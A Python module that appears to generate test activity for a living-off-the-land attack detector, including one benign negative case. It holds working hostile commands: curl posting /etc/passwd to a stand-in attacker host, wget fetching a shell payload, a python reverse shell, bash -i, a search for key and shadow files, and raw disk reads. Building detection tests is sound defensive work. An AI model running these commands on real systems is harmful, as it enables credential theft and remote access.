"""Living-off-the-land attack generators using real system binaries."""

import subprocess


def curl_exfil_data(target: str = "http://attacker.example.com") -> subprocess.Popen:
    """POST /etc/passwd to an external host via curl."""
    return subprocess.Popen(
        ["curl", "-s", "-X", "POST", target,
         "--data", "@/etc/passwd", "--max-time", "2"],
        stderr=subprocess.DEVNULL,
    )


def wget_download_payload() -> subprocess.Popen:
    """Download a remote payload into /tmp using wget."""
    return subprocess.Popen(
        ["wget", "-q", "-O", "/tmp/.payload", "http://10.0.0.1/shell"],
        stderr=subprocess.DEVNULL,
    )


def python_reverse_shell(host: str = "127.0.0.1", port: int = 4444) -> subprocess.Popen:
    """python3 one-liner reverse shell (connect back + pty)."""
    code = (
        f"import socket,os,pty; s=socket.socket(); s.connect(('{host}',{port})); "
        f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); pty.spawn('/bin/bash')"
    )
    return subprocess.Popen(["python3", "-c", code], stderr=subprocess.DEVNULL)


def bash_interactive_shell() -> subprocess.Popen:
    """Spawn bash -i — common post-exploitation step."""
    return subprocess.Popen(
        ["bash", "-i"],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def find_sensitive_files() -> subprocess.Popen:
    """Use find to locate *.key, *.pem, shadow, and passwd under /etc."""
    return subprocess.Popen(
        ["find", "/etc",
         "-name", "*.key", "-o",
         "-name", "*.pem", "-o",
         "-name", "shadow", "-o",
         "-name", "passwd"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def dd_disk_image() -> subprocess.Popen:
    """Read raw disk blocks via dd — data exfiltration preparation."""
    return subprocess.Popen(
        ["dd", "if=/dev/sda", "of=/dev/null", "bs=512", "count=100"],
        stderr=subprocess.DEVNULL,
    )


def apt_list_packages() -> subprocess.Popen:
    """Negative: legitimate apt-get list — should not trigger any LotL alert."""
    return subprocess.Popen(
        ["apt-get", "list", "--installed"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
